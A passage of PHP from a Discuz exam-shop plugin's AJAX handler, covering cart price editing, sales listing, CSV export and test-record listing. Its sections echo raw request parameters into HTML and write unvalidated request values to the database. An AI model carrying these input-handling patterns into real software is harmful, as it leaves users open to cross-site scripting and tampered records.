	$ktxmoney = C::t('#it618_exam#it618_exam_shop')->fetch_money_by_id($ShopId);
	
	if($_GET['it618_type']==0)$selected0='selected="selected"';
	if($_GET['it618_type']==10)$selected10='selected="selected"';
	if($_GET['it618_type']==1)$selected1='selected="selected"';
	if($_GET['it618_type']==2)$selected2='selected="selected"';
	if($_GET['it618_type']==3)$selected3='selected="selected"';
	
	if($_GET['it618_state']==0)$stateselected0='selected="selected"';
	if($_GET['it618_state']==1)$stateselected1='selected="selected"';
	if($_GET['it618_state']==2)$stateselected2='selected="selected"';
	
	echo $ktxmoney.'it618_split<tr><td colspan=10 style="line-height:30px">'.it618_exam_getlang('s254').' <select id="it618_type"><option value="0" '.$selected0.'>'.it618_exam_getlang('s255').'</option><option value="10" '.$selected10.'>'.it618_exam_getlang('s246').'</option><option value="1" '.$selected1.'>'.it618_exam_getlang('s257').'</option><option value="2" '.$selected2.'>'.it618_exam_getlang('s247').'</option><option value="3" '.$selected3.'>'.it618_exam_getlang('s256').'</option></select> '.it618_exam_getlang('s258').' <input id="it618_time1" value="'.$_GET['it618_time1'].'" class="txt" style="width:90px;margin-right:0" onclick="SetDate(this,\'yyyy-MM-dd\')" readonly="readonly"/> - <input id="it618_time2" value="'.$_GET['it618_time2'].'" class="txt" style="width:90px;" onclick="SetDate(this,\'yyyy-MM-dd\')" readonly="readonly"/>'.it618_exam_getlang('s273').' <select id="it618_state"><option value="0" '.$stateselected0.'>'.it618_exam_getlang('s260').'</option><option value="1" '.$stateselected1.'>'.it618_exam_getlang('s261').'</option><option value="2" '.$stateselected2.'>'.it618_exam_getlang('s262').'</option></select> <input type="button" class="btn" style="width:60px;height:25px" onclick="findtx()" value="'.it618_exam_getlang('s350').'" /><span style="float:right">'.it618_exam_getlang('s263').'<font color=red>'.$count.'</font> '.it618_exam_getlang('s264').'<font color=red>'.$sum.'</font> '.it618_exam_getlang('s125').'</span></td></tr><tr></tr>'.$th.$tx_get.$multipage;
	exit;
}



if($_GET['ac']=="gwclist_editprice"){
	if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	
	$gwcuid=intval($_GET['gwcuid']);
	$count=C::t('#it618_exam#it618_exam_gwc')->count_by_uid_shopid($gwcuid,$ShopId);
	$funname='gwclist_editprice';
	
	$allsummoney=0;
	foreach(C::t('#it618_exam#it618_exam_gwc')->fetch_all_by_uid_shopid($gwcuid,$ShopId) as $it618_exam_gwc) {
		if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($ii1i11i[3]!='1')exit;
		
		$it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_exam_gwc['it618_pid']);
		$it618_exam_shop = C::t('#it618_exam#it618_exam_shop')->fetch_by_id($it618_exam_goods['it618_shopid']);
		
		$it618_count=$it618_exam_gwc['it618_count'];
		
		$gtypename='';
		if($it618_exam_gwc['it618_gtypeid']>0){
			$gtypename = C::t('#it618_exam#it618_exam_goods_type')->fetch_it618_name_by_id($it618_exam_gwc['it618_gtypeid']);
			$gtypename = '<font color="#999">'.$it618_exam_lang['s1131'].':</font><font color=red>'.$gtypename.'</font>';
			
			$it618_exam_goods_type = C::t('#it618_exam#it618_exam_goods_type')->fetch_by_id($it618_exam_gwc['it618_gtypeid']);
			$it618_saleprice=$it618_exam_goods_type['it618_saleprice'];
			$it618_salescore=$it618_exam_goods_type['it618_score'];
			$it618_salejfid=$it618_exam_goods_type['it618_jfid'];
		}else{
			$it618_saleprice=$it618_exam_goods['it618_saleprice'];
			$it618_salescore=$it618_exam_goods['it618_score'];
			$it618_salejfid=$it618_exam_goods['it618_jfid'];
		}
			
		if($it618_saleprice>0&&$it618_salescore>0){
			$goodsjfname=$_G['setting']['extcredits'][$it618_salejfid]['title'];
			$goodspricestr='&yen;'.$it618_saleprice.' + '.$it618_salescore.' '.$goodsjfname;
			$goodspricestr1='<font color=red>&yen;</font><input type="text" style="width:68px;color:red;margin-top:3px;border:#e8e8e8 1px solid;line-height:18px" id="it618_price'.$it618_exam_gwc['id'].'" value="{price}"> + <input type="text" style="width:58px;color:red;margin-top:3px;border:#e8e8e8 1px solid;line-height:18px" id="it618_pricescore'.$it618_exam_gwc['id'].'" value="{score}">'.$goodsjfname;
			$goodspricestr2='&yen;{price} + {score} '.$goodsjfname;
		}else{
			if($it618_saleprice>0){
				$goodspricestr='&yen;'.$it618_saleprice;
				$goodspricestr1='<font color=red>&yen;</font><input type="text" style="width:68px;color:red;margin-top:3px;border:#e8e8e8 1px solid;line-height:18px" id="it618_price'.$it618_exam_gwc['id'].'" value="{price}"><input type="hidden" id="it618_pricescore'.$it618_exam_gwc['id'].'" value="0">';
				$goodspricestr2='&yen;{price}';
			}
			
			if($it618_salescore>0){
				$goodsjfname=$_G['setting']['extcredits'][$it618_salejfid]['title'];
				$goodspricestr=$it618_salescore.' '.$goodsjfname;
				$goodspricestr1='<input type="hidden" id="it618_price'.$it618_exam_gwc['id'].'" value="0"><input type="text" style="width:58px;color:red;margin-top:3px;border:#e8e8e8 1px solid;line-height:18px" id="it618_pricescore'.$it618_exam_gwc['id'].'" value="{score}">'.$goodsjfname;
				$goodspricestr2='{score} '.$goodsjfname;
			}
		}
		
		if($it618_exam_gwc['it618_iseditprice']==1){
			$it618_price=$it618_exam_gwc['it618_price'];
			
			$it618_score=$it618_exam_gwc['it618_pricescore'];
		}else{
			$it618_price=$it618_saleprice;
			$it618_score=$it618_salescore;
		}
		
		$goodspricestr1=str_replace("{price}",$it618_price,$goodspricestr1);
		$goodspricestr1=str_replace("{score}",$it618_score,$goodspricestr1);
		$goodspricestr2=str_replace("{price}",$it618_price*$it618_count,$goodspricestr2);
		$goodspricestr2=str_replace("{score}",$it618_score*$it618_count,$goodspricestr2);
		$goodspricestr2='<font color="#FF7E00">'.$goodspricestr2.'</font> ';
		
		if($_GET['ac1']=='pcgwc'){
			$salepricestr=$it618_exam_lang['s1795'].$goodspricestr.'<br>'.$it618_exam_lang['s1797'].$goodspricestr1.' <input type="button" style="border:none;background-color:#390;color:#fff;line-height:28px;height:30px;width:50px;border-radius:3px;cursor:pointer" value="'.it618_exam_getlang('s885').'" onclick="save_editprice('.$it618_exam_gwc['id'].')" />';
		}else{
			$salepricestr='<br>'.$it618_exam_lang['s1795'].$goodspricestr.'<br>'.$it618_exam_lang['s1797'].$goodspricestr1.' <input type="button" style="border:none;background-color:#390;color:#fff;line-height:28px;height:30px;width:50px;border-radius:3px;cursor:pointer" value="'.it618_exam_getlang('s885').'" onclick="save_editprice('.$it618_exam_gwc['id'].')" />';
		}
		
		$it618_saleprice=$it618_price;
		$it618_salescore=$it618_score;
		
		$summoney=$it618_saleprice;
		$allsummoney=$allsummoney+$summoney;
		
		if($it618_salescore>0){
			$allsumscore[$it618_salejfid]+=$it618_salescore;
		}
		
		$jfblstr='';
		if($it618_exam_goods['it618_jfbl']>0){
			$zsmoney=intval($it618_exam_goods['it618_jfbl']*$summoney/100);
			if($zsmoney>=1){
				$jfblstr='<font color=#888>'.$it618_exam_lang['s1110'].'<font color=red>'.intval($it618_exam_goods['it618_jfbl']*$summoney/100).'</font>'.$creditname.'</font>';
				$allzsmoney=$allzsmoney+$zsmoney;
			}
		}

		if($_GET['ac1']=='pcgwc'){
			$tmpurl=it618_exam_getrewrite('exam_product',$it618_exam_goods['id'],'plugin.php?id=it618_exam:product&pid='.$it618_exam_goods['id']);

			$goodslist.='<tr><td>
							<a href="'.$tmpurl.'" target="_blank">
							<div style="float:left;width:108px">
							<img src="'.it618_exam_getwapppic($it618_exam_goods['it618_shopid'],$it618_exam_goods['id'],$it618_exam_goods['it618_picbig']).'" width="100" height="63"/></a>
							</div>
							<div style="float:left;width:580px">
							<a href="'.$tmpurl.'" target="_blank" title="'.$it618_exam_goods['it618_name'].'" style="font-size:13px">'.$it618_exam_goods['it618_name'].'</a><br>
							<p>'.$gtypename.'</p>
							<p>'.$goodspricestr2.'</p>
							</div>
							</td>
							<td style="color:#999">
							'.$salepricestr.'
							</td><td>
							'.$it618_exam_gwc['it618_count'].'
							</td></tr>';
		}
		
		if($_GET['ac1']=='wapgwc'){
			$tmpurl=it618_exam_getrewrite('exam_wap','product@'.$it618_exam_goods['id'],'plugin.php?id=it618_exam:wap&pagetype=product&cid='.$it618_exam_goods['id']);
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			
			$goodslist.='<tr id="gwcpid'.$it618_exam_gwc['id'].'" class="cart-list cl"><td><table width="100%">
							<tr class="gwclisttr1">
							<td width="113" style="padding-left:3px">
							<a class="product-img" href="'.$tmpurl.'" target="_blank">
							<img src="'.it618_exam_getwapppic($it618_exam_goods['it618_shopid'],$it618_exam_goods['id'],$it618_exam_goods['it618_picbig']).'" width="108" height="65"/></a>
							</td>
							<td colspan="3">
							<a class="name" href="'.$tmpurl.'" target="_blank" title="'.$it618_exam_goods['it618_name'].'" style="font-size:13px;color:#666">'.$it618_exam_goods['it618_name'].'</a><br>
							'.$gtypename.' <font color=#999>'.$it618_exam_lang['s1132'].':</font><font color=red>'.$it618_exam_gwc['it618_count'].'</font><br>
							<p>'.$jfblstr.'</p>
							<p>'.$goodspricestr2.'</p>
							</td></tr>
							<tr><td colspan="4" style="height:6px"></td></tr>
							<tr class="gwclisttr2"><td colspan="4" style="color:#999;text-align:right;border-top:#f1f1f1 1px solid">
							'.$salepricestr.'
							</td></tr>
						</table></td></tr>';
			
		}

	}
	
	if($allzsmoney>0){
		$jfmoenystr.=$it618_exam_lang['s1113'].'<font color=red>'.$allzsmoney.'</font>'.$creditname;
	}
	
	for($i=1;$i<=8;$i++){
		if($allsumscore[$i]>0){
			$jfname=$_G['setting']['extcredits'][$i]['title'];
			$scorestr.=$allsumscore[$i].$jfname.'+';
		}
	}
	
	if($scorestr!=''){
		$scorestr.='@';
		$scorestr=str_replace("+@","",$scorestr);
	}
	
	if($allsummoney>0&&$scorestr!=''){
		$summoneystr.='&yen;'.$allsummoney.'+'.$scorestr;
	}else{
		if($allsummoney>0){
			$summoneystr.='&yen;'.$allsummoney;
		}
		if($scorestr!=''){
			$summoneystr.=$scorestr;
		}
	}
	
	C::t('#it618_exam#it618_exam_gwc')->update_state_by_uid_shopid(1,$gwcuid,$ShopId);
	
	if($_GET['ac1']=='pcgwc'){
		$editbtn='<tr><td colspan="4"><input type="button" class="btn" value="'.it618_exam_getlang('s1796').'" onclick="state_editprice()" /></td></tr>';
		echo $goodslist.'<tr><td colspan="4"><span style="float:right">'.it618_exam_getusername($gwcuid).' '.$it618_exam_lang['s1074'].'<b><font color=red>'.$summoneystr.'</font></b></span><span style="float:left">'.$jfmoenystr.'</span></td></tr>'.$editbtn;
	}else{
		$editbtn='<tr><td colspan="4"><input type="button" class="it618btn" style="width:100%;height:40px;border-radius:3px;background-color:#390;" value="'.it618_exam_getlang('s1796').'" onclick="state_editprice()" /></td></tr>';
		echo $goodslist.'<tr><td align="right" style="padding:6px;padding-right:10px;padding-bottom:0;line-height:15px;color:#999">'.$jfmoenystr.'</td></tr><tr><td align="right" style="padding:10px">'.it618_exam_getusername($gwcuid).' '.$it618_exam_lang['s1074'].' <b><font color="#FF6600" style="font-size:18px">'.$summoneystr.'</font></b></td></tr>'.$editbtn;
	}
	exit;
}


if($_GET['ac']=="save_editprice"){
	$it618_exam_gwc=C::t('#it618_exam#it618_exam_gwc')->fetch_by_id($_GET['gid']);
	if($it618_exam_gwc['it618_shopid']!=$ShopId){
		echo it618_exam_getlang('s513');exit;
	}
	
	$it618_price = DB::result_first("SELECT it618_price FROM ".DB::table('it618_exam_shop')." WHERE id=".$ShopId);
	if($_GET['price']>$it618_price){
		$it618_price=$_GET['price'];
	}
	
	C::t('#it618_exam#it618_exam_gwc')->update($_GET['gid'],array(
		'it618_price' => $it618_price,
		'it618_pricescore' => $_GET['score'],
		'it618_iseditprice' => 1
	));
	exit;
}


if($_GET['ac']=="state_editprice"){
	$gwcuid=intval($_GET['gwcuid']);
	C::t('#it618_exam#it618_exam_gwc')->update_state_by_uid_shopid(0,$gwcuid,$ShopId);
	
	echo it618_exam_getlang('s1798');
	exit;
}


if($_GET['ac']=="sale_dao"){	
	$strtmp=$it618_exam_lang['s1104']."\n";
	foreach(C::t('#it618_exam#it618_exam_sale')->fetch_all_by_search(
		$ShopId,"s.it618_tel!='' and s.it618_state!=0 ",'s.it618_uid,s.id desc',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2'],0,0
	) as $it618_exam_sale) {
		$it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_exam_sale['it618_pid']);
		
		$jftmp='';
		if($it618_exam_sale['it618_jfbl']>0&&$it618_exam_sale['it618_price']>0){
			$it618_jfbl=intval($it618_exam_sale['it618_jfbl']*$it618_exam_sale['it618_price']/100);
			$jftmp=$it618_jfbl.$creditname;
		}
		
		if($it618_exam_sale['it618_price']>0||$it618_exam_sale['it618_score']>0){
			$pricestr=it618_exam_getsalemoney($it618_exam_sale);
		}else{
			$pricestr=$it618_exam_lang['s106'];
		}
	
		$it618_tc='';
		if($it618_exam_sale['it618_tcbl']>0){
			$it618_tc=it618_exam_getlang('s244').$it618_exam_sale['it618_tcbl'].'% ';
			$it618_tc.=it618_exam_getlang('s245').$it618_exam_sale['it618_tc'];
			
			if($it618_exam_sale['it618_score']>0){
				$tmptc=intval($it618_exam_sale['it618_tcbl']*$it618_exam_sale['it618_score']/100);
				$jfname=$_G['setting']['extcredits'][$it618_exam_sale['it618_jfid']]['title'];
				$it618_tc.=it618_exam_getlang('s670').$tmptc.$jfname;
			}
		}
		
		$gtypename=C::t('#it618_exam#it618_exam_goods_type')->fetch_it618_name_by_id($it618_exam_sale['it618_gtypeid']);
		
		$strtmp.=$it618_exam_goods['id'].",".$it618_exam_goods['it618_name'].",".$gtypename.'*'.$it618_exam_sale['it618_count'].",".$pricestr.",".$jftmp.",".$it618_tc.",".it618_exam_getusername($it618_exam_sale['it618_uid'])." ".$it618_exam_sale['it618_tel'].",".date('Y-m-d H:i:s', $it618_exam_sale['it618_time'])."\n";
		$datacount=$datacount+1;
	}
	
	$datapath1=DISCUZ_ROOT.'./source/plugin/it618_exam/kindeditor/data/shop'.$ShopId.'/';
	if(!file_exists($datapath1)) {
		mkdir($datapath1);
	}
	$datapath=DISCUZ_ROOT.'./source/plugin/it618_exam/kindeditor/data/shop'.$ShopId.'/dao/';
	if(!file_exists($datapath)) {
		mkdir($datapath);
	}
	
	if($_GET['it618_time1']!=''||$_GET['it618_time2']!=''){
		if($_GET['it618_time1']!=''){
			$timetmp1=str_replace("-","",$_GET['it618_time1']);
		}else{
			$timetmp1='null';
		}
		if($_GET['it618_time2']!=''){
			$timetmp2=str_replace("-","",$_GET['it618_time2']);
		}else{
			$timetmp2='null';
		}
		$timetmp=$timetmp1.'-'.$timetmp2;
	}
	$timestr=md5(date("YmdHis").FORMHASH).'_'.$timetmp. '_' . $datacount;
	it618_exam_delfile($datapath);
	
	@$fp = fopen($datapath.$timestr.'.csv',"w");
	if(!$fp){
		echo "system error";
		exit();
	}else {
		fwrite($fp,$strtmp);
		fclose($fp);
	}
	
	echo $_G['siteurl'].'source/plugin/it618_exam/kindeditor/data/shop'.$ShopId.'/dao/'.$timestr.'.csv';
	exit;
}


if($_GET['ac']=="sale_get"){
	if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	
	$ppp = 11;
	$th='<tr><th>'.it618_exam_getlang('s265').'</th><th>'.it618_exam_getlang('s266').'</th><th>'.it618_exam_getlang('s267').'</th><th>'.it618_exam_getlang('s268').'</th><th>'.it618_exam_getlang('s269').'</th><th>'.it618_exam_getlang('s270').'</th><th>'.it618_exam_getlang('s272').'</th><th>'.it618_exam_getlang('s273').'</th></tr>';
	
	$count = C::t('#it618_exam#it618_exam_sale')->count_by_search($ShopId,"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2']);
	$summoney = C::t('#it618_exam#it618_exam_sale')->sum_money_by_search($ShopId,"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2']);
	$sumtcmoney = C::t('#it618_exam#it618_exam_sale')->sum_tcmoney_by_search($ShopId,"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2']);
	
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
	$multipage = multi($count, $ppp, $page, "plugin.php?id=it618_exam:sc_sale".$urlsql);
	
	$salesum= '<td colspan=15>'.it618_exam_getlang('s229').'<font color=red>'.$count.'</font> '.it618_exam_getlang('s230').'<font color=red>'.$summoney.'</font> '.it618_exam_getlang('s415').'<font color=red>'.$sumtcmoney.'</font><span style="float:right">'.it618_exam_getlang('s416').'</span></td>';
	
	
	$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_exam:ajax");
	$multipage=str_replace("href=","name=",$multipage);
	$multipage=str_replace("name=","href='javascript:' onclick='getsalelist(this.name)' name=",$multipage);
	$multipage=str_replace("onclick='getsalelist(this.name)' ".'name="custompage"','',$multipage);
	$multipage=str_replace('window.location=','getsalelist(',$multipage);
	$multipage=str_replace('this.value;;','this.value);',$multipage);
			
	foreach(C::t('#it618_exam#it618_exam_sale')->fetch_all_by_search(
		$ShopId,"s.it618_tel!='' and s.it618_state!=0 ".$it618sql,'s.id desc',$_GET['pname'],$_GET['finduid'], $_GET['it618_time1'], $_GET['it618_time2'],$startlimit,$ppp
	) as $it618_exam_sale) {
		
		$it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_exam_sale['it618_pid']);
		
		$jftmp='';
		if($it618_exam_sale['it618_jfbl']>0&&$it618_exam_sale['it618_price']>0){
			$it618_jfbl=intval($it618_exam_sale['it618_jfbl']*$it618_exam_sale['it618_price']/100);
			$jftmp=$it618_jfbl.$creditname;
		}
		
		if($it618_exam_sale['it618_price']>0||$it618_exam_sale['it618_score']>0){
			$pricestr='<font color=red>'.it618_exam_getsalemoney($it618_exam_sale).'</font>';
		}else{
			$pricestr='<font color=#390>'.$it618_exam_lang['s106'].'</font>';
		}
	
		$it618_tc='';
		if($it618_exam_sale['it618_tcbl']>0){
			$it618_tc=$it618_exam_sale['it618_tcbl'].'% ';
			$it618_tc.='<font color=red>'.$it618_exam_sale['it618_tc'].'</font>'.$it618_exam_lang['s125'].' ';
			
			if($it618_exam_sale['it618_score']>0){
				$tmptc=intval($it618_exam_sale['it618_tcbl']*$it618_exam_sale['it618_score']/100);
				$jfname=$_G['setting']['extcredits'][$it618_exam_sale['it618_jfid']]['title'];
				$it618_tc.=' <font color=red>'.$tmptc.'</font>'.$jfname;
			}
			
			$it618_tc=$it618_exam_lang['s1206'].$it618_tc;
		}
		
		$it618_tuitc='';
		if($it618_exam_sale['it618_tuitcbl']>0){
			$it618_tuitc=$it618_exam_sale['it618_tuitcbl'].'% ';
			$it618_tuitc.='<font color=red>'.$it618_exam_sale['it618_tuitc'].'</font>'.$it618_exam_lang['s125'].' ';
			
			if($it618_exam_sale['it618_score']>0){
				$tmptc=intval($it618_exam_sale['it618_tuitcbl']*$it618_exam_sale['it618_score']/100);
				$jfname=$_G['setting']['extcredits'][$it618_exam_sale['it618_jfid']]['title'];
				$it618_tuitc.=' <font color=red>'.$tmptc.'</font>'.$jfname;
			}
			
			$it618_tuitc='<br>'.$it618_exam_lang['s1207'].$it618_tuitc;
		}
		
		$gtypename=C::t('#it618_exam#it618_exam_goods_type')->fetch_it618_name_by_id($it618_exam_sale['it618_gtypeid']);
		
		
		
		$tmpurl=it618_exam_getrewrite('exam_product',$it618_exam_goods['id'],'plugin.php?id=it618_exam:product&pid='.$it618_exam_goods['id']);
		$sale_get.='<tr class="hover">
		<td><input class="checkbox" type="checkbox" id="chk_del'.$it618_exam_sale[id].'" name="delete[]" value="'.$it618_exam_sale[id].'" '.$disabled.'><label for="chk_del'.$it618_exam_sale[id].'">'.$it618_exam_sale['id'].'</label></td>
		<td><a href="'.$tmpurl.'" target="_blank">'.$it618_exam_goods['it618_name'].'</a> <font color=#999>'.$it618_exam_lang['s819'].$it618_exam_goods['it618_questioncount'].$it618_exam_lang['s820'].'</font><br>'.$pricestr.'</td>
		<td>'.$jftmp.'</td>
		<td>'.$it618_tc.$it618_tuitc.'</td>
		<td><font color=blue>'.$gtypename.'*'.$it618_exam_sale['it618_count'].'</font><br><a href="'.it618_exam_rewriteurl($it618_exam_sale['it618_uid']).'" target="_blank">'.it618_exam_getusername($it618_exam_sale['it618_uid']).'</a> '.$it618_exam_sale['it618_tel'].'</td>
		<td><font color=#999>'.date('Y-m-d H:i:s', $it618_exam_sale['it618_time']).'</font></td>
		</tr>';

	}

	
	$multipage='<td colspan=15><div class="cuspages right">'.$multipage.'</div><input type=hidden value='.$page.' name=page /><script>'.$tmpjs.'</script></td>';
	
	echo $salesum.'it618_split'.$sale_get.'it618_split'.$multipage;
	exit;
}


if($_GET['ac']=="test_get"){
	if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
	
	$ppp = 11;
	
	$count = C::t('#it618_exam#it618_exam_test_exam')->count_by_search($ShopId, '', '', $_GET['pname'], $_GET['uid']);
	
	$page = max(1, intval($_GET['page']));
	$startlimit = ($page - 1) * $ppp;
			
	foreach(C::t('#it618_exam#it618_exam_test_exam')->fetch_all_by_search(
		$ShopId, '', 's.it618_btime desc', $_GET['pname'], $_GET['uid'], '', '', $startlimit,$ppp
	) as $it618_exam_test_exam) {
		
		$it618_exam_goods = C::t('#it618_exam#it618_exam_goods')->fetch_by_id($it618_exam_test_exam['it618_pid']);
		
		$tmpurl=it618_exam_getrewrite('exam_product',$it618_exam_goods['id'],'plugin.php?id=it618_exam:product&pid='.$it618_exam_goods['id']);
		$pnamestr='<a href="'.$tmpurl.'" target="_blank"><font color=#333>'.$it618_exam_goods['it618_name'].'</font></a>';
		
		$it618_exam_test_exam['it618_testscore']=str_replace(".0","",$it618_exam_test_exam['it618_testscore']);
		
		$it618_exam_test_exam['it618_score']=str_replace(".0","",$it618_exam_test_exam['it618_score']);
		$it618_examstr=str_replace("{qcount}",$it618_exam_test_exam['it618_questioncount'],$it618_exam_lang['s168']);
		$it618_examstr=str_replace("{score}",$it618_exam_test_exam['it618_score'],$it618_examstr);
		$it618_examstr=str_replace("{time}",$it618_exam_test_exam['it618_examtime'],$it618_examstr);
		
		if($it618_exam_test_exam['it618_state']==3){
			$testurl=it618_exam_getrewrite('exam_test',$it618_exam_test_exam['id'],'plugin.php?id=it618_exam:test&eid='.$it618_exam_test_exam['id']);
			
			if($_GET['ac1']=='wapmyshoptest'){
				$it618_state='<font color=#390>'.$it618_exam_lang['s536'].'</font> <a href="'.$testurl.'" target="_blank">'.$it618_exam_lang['s555'].'</a>';
			}else{
				$it618_state='<font color=#390>'.$it618_exam_lang['s536'].'</font><br><a href="'.$testurl.'" target="_blank">'.$it618_exam_lang['s555'].'</a>';
			}
			
		}else{
			$it618_state='<font color=red>'.$it618_exam_lang['s534'].'</font>';
		}
		
	    if($_GET['ac1']=='wapmyshoptest'){
			
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			
			$tmpurl=it618_exam_getrewrite('exam_wap','product@'.$it618_exam_goods['id'],'plugin.php?id=it618_exam:wap&pagetype=product&cid='.$it618_exam_goods['id']);
			$test_get.='<dd style="padding-bottom:10px; padding-top:13px;border-bottom:#f1f1f1 1px solid">
						<table width="100%">
							<tr><td width="125" style="vertical-align:top;border:none">
							<a href="'.$tmpurl.'">
							<img src="'.it618_exam_getwapppic($it618_exam_goods['it618_shopid'],$it618_exam_goods['id'],$it618_exam_goods['it618_picbig']).'" width="118" height="72" style="border-radius: 3px;"/></a>
							</td><td style="vertical-align:top;line-height:18px;border:none">
							<a class="name" href="'.$tmpurl.'" target="_blank" style="font-size:14px;color:#333">'.$it618_exam_goods['it618_name'].'</a><br>
							<font color=#999>'.$it618_examstr.'</font><br><font color=#999>'.date('Y-m-d H:i:s', $it618_exam_test_exam['it618_btime']).' - '.date('Y-m-d H:i:s', $it618_exam_test_exam['it618_etime']).'</font><br>'.it618_exam_getusername($it618_exam_test_exam['it618_uid']).' <font color=#999>'.$it618_exam_lang['t229'].'</font>:<font color=red>'.$it618_exam_test_exam['it618_testscore'].'</font><br>'.$it618_state.'
							</td></tr>
						</table>
					</dd>';
		}else{
			$test_get.='<tr class="hover">
				<td>'.$pnamestr.'<br><font color=#999>'.$it618_examstr.'</font></td>
				<td><a href="'.it618_exam_rewriteurl($it618_exam_test_exam['it618_uid']).'" target="_blank">'.it618_exam_getusername($it618_exam_test_exam['it618_uid']).'</a></td>
				<td><font color=red>'.$it618_exam_test_exam['it618_testscore'].'</font><br></td>
				<td>'.$it618_state.'</td>
				<td><font color=#999>'.date('Y-m-d H:i:s', $it618_exam_test_exam['it618_btime']).'<br>'.date('Y-m-d H:i:s', $it618_exam_test_exam['it618_etime']).'</font></td>
				</tr>';
		}

	}

	if($_GET['ac1']=='wapmyshoptest'){
		$funname='getmyshoptestlist';
		
		if($count<=$ppp){
			$pagecount=1;
		}else{
			$pagecount=ceil($count/$ppp);
		}
		
		if($pagecount>1){
			$n=1;
			while($n<=$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".$n;
				if($page==$n)$tmpselect=' selected="selected"';else $tmpselect='';
				$curpage.='<option value="'.$tmpurl.'"'.$tmpselect.'>'.$n.'/'.$pagecount.'</option>';
				$n=$n+1;
			}
			$curpage='<select class="pageselect" onchange="'.$funname.'(this.value)">'.$curpage.'</select>';
			if(lang('plugin/it618_exam', $it618_exam_lang['it618'])!=$it618_exam_lang['version'])exit;
			if($page==1){
				$pagepre='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s510').'</a>';
				if($pagecount>1){
					$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=2";
					$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
				}else{
					$pagenext='<a class="btn btn-weak btn-disabled">'.it618_exam_getlang('s511').'</a>';
				}
			}elseif($page<$pagecount){
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page+1);
				$pagenext='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s511').'</a>';
			}else{
				$tmpurl=$_G['siteurl']."plugin.php?id=it618_exam:ajax&page=".($page-1);
				$pagepre='<a href="javascript:" class="btn btn-weak" onclick="'.$funname.'(\''.$tmpurl.'\')">'.it618_exam_getlang('s510').'</a>';
				$pagenext='<a class="btn btn-weak btn-disabled" >'.it618_exam_getlang('s511').'</a>';
			}
			$multipage=$pagepre.' '.$curpage.' '.$pagenext;
			
			$testsum= it618_exam_getlang('s671').'<font color=red>'.$count.'</font>';
		}
	}else{
		$multipage = multi($count, $ppp, $page, $_G['siteurl']."plugin.php?id=it618_exam:ajax");
		$multipage=str_replace("href=","name=",$multipage);
		$multipage=str_replace("name=","href='javascript:' onclick='gettestlist(this.name)' name=",$multipage);
		$multipage=str_replace("onclick='gettestlist(this.name)' ".'name="custompage"','',$multipage);
		$multipage=str_replace('window.location=','gettestlist(',$multipage);
		$multipage=str_replace('this.value;;','this.value);',$multipage);
		
		$multipage='<td colspan=15><div class="cuspages right">'.$multipage.'</div><input type=hidden value='.$page.' name=page /></td>';
		
		$testsum= '<td colspan=15>'.it618_exam_getlang('s671').'<font color=red>'.$count.'</font></td>';
	}

	echo $testsum.'it618_split'.$test_get.'it618_split'.$multipage;
	exit;
}


if($_GET['ac']=="getgoodstype"){
	if($it618_exam_goods_type=C::t('#it618_exam#it618_exam_goods_type')->fetch_by_pid_name_name1_ok($_GET['pid'],it618_exam_utftogbk($_GET['gtypename']),it618_exam_utftogbk($_GET['gtypename1']))){
		
		if($it618_exam_goods_type['it618_saleprice']>0&&$it618_exam_goods_type['it618_score']>0){
			$goodsjfname=$_G['setting']['extcredits'][$it618_exam_goods_type['it618_jfid']]['title'];
			$goodspricestr='<em>&yen;</em>'.$it618_exam_goods_type['it618_saleprice'].' + '.$it618_exam_goods_type['it618_score'].'<em>'.$goodsjfname.'</em>';
		}else{
			if($it618_exam_goods_type['it618_saleprice']>0){
				$goodspricestr='<em>&yen;</em>'.$it618_exam_goods_type['it618_saleprice'];
				$paytype=$it618_exam_lang['t304'];
			}
			
			if($it618_exam_goods_type['it618_score']>0){
				$goodsjfname=$_G['setting']['extcredits'][$it618_exam_goods_type['it618_jfid']]['title'];
				$goodspricestr=$it618_exam_goods_type['it618_score'].'<em style="padding-left:6px">'.$goodsjfname.'</em>';
			}
			
			if($it618_exam_goods_type['it618_saleprice']==0&&$it618_exam_goods_type['it618_score']==0){
				$goodspricestr=$it618_exam_lang['s106'];
			}
		}
		
		if($_GET['wap']==1){
			if($it618_exam_goods_type['it618_price']>0){
